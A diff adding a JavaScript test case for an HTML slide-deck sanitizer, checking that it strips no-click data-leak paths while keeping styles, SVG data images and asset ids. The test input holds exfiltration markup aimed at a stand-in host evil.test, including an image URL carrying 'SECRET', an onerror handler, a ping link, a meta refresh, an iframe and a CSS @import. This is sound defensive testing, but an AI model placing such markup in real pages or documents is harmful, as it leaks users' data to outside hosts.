@@ -56,6 +56,27 @@ const assert = (cond, msg) => {
   assert(out && out.slides[0].includes('<p>oi</p>'), 'sanitizeHtmlDeck keeps the non-script markup')
 }
 
+// md-exfil T5: no-click egress paths are stripped, layout/SVG/data:/asset ids are kept
+{
+  const out = sanitizeHtmlDeck({
+    title: 'x',
+    slides: [
+      '<section style="padding:40px;background:#fff"><img src="https://evil.test/p.png?d=SECRET" onerror="x()"><img data-ds-asset-id=\'logo_1\'>' +
+        '<div style="background:url(https://evil.test/b.png);width:200px">a</div><a href="javascript:1" ping="https://evil.test/p">l</a>' +
+        '<meta http-equiv="refresh" content="0;url=https://evil.test/"><iframe src="https://evil.test/"></iframe>' +
+        '<svg viewBox="0 0 4 4"><image href="data:image/png;base64,AAAA"/><rect fill="url(#g)"/></svg><style>@import url(https://evil.test/c.css);h1{color:red}</style></section>',
+    ],
+  })
+  const h = out?.slides[0] || ''
+  assert(out && !/evil\.test|SECRET|onerror|javascript:|ping=|<meta|<iframe/i.test(h), 'sanitizeHtmlDeck strips handlers, script URLs, meta, frames, ping and remote references')
+  assert(/padding:40px;background:#fff/.test(h) && /width:200px/.test(h) && /h1\{color:red\}/.test(h), 'sanitizeHtmlDeck keeps inline styles and <style> rules')
+  assert(/<image href="data:image\/png/.test(h) && /fill="url\(#g\)"/.test(h), 'sanitizeHtmlDeck keeps SVG <image href=data:> and fragment paints')
+  assert(/data-ds-asset-id="logo_1"/.test(h), 'sanitizeHtmlDeck keeps a single-quoted data-ds-asset-id (as a double-quoted attribute)')
+  const again = sanitizeHtmlDeck({ title: 'x', slides: [h] })
+  assert(again && again.slides[0] === h, 'sanitizeHtmlDeck is idempotent')
+  assert(resolveDeckAssets("<img data-ds-asset-id='logo_1'>", new Map([['logo_1', 'data:image/png;base64,ZZ']])).includes('base64,ZZ'), 'resolveDeckAssets resolves a single-quoted id')
+}
+
 // empty / malformed inputs are rejected (return null, never throw)
 {
   assert(sanitizeHtmlDeck(null) === null, 'sanitizeHtmlDeck(null) → null')
